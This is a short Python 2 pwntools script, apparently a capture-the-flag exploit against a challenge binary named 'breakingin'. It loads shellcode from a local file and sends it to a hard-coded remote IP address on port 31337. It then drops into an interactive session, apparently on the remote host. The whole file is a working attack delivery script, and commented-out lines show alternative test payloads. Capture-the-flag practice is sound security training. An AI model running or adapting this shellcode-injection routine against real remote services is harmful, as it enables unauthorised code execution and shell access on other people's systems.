#!/bin/python2
from pwn import *
bin='./breakingin'
elf = ELF(bin)


#s = remote('localhost', '31337')
#s.recvuntil('Password:')
#sleep(5)



#f = open('./testneg.bin', "rb")
#f = open('./testfuckputs.bin', "rb")
f = open('./rootle.bin', "rb")
shellcode = f.read()
f.close()


#curop = 0x13376968


def sysc():
#	s = process(bin)
	s = remote('35.153.138.213', 31337)
	s.recvuntil('):')
	s.send(str(len(shellcode)) + '\n')
	s.recvuntil(':\n')
	s.write(shellcode)
	s.interactive()
	res = s.recvall().partition('nulls)\n')[0].decode('utf-8')
	s.close()
	print(res)


sysc()
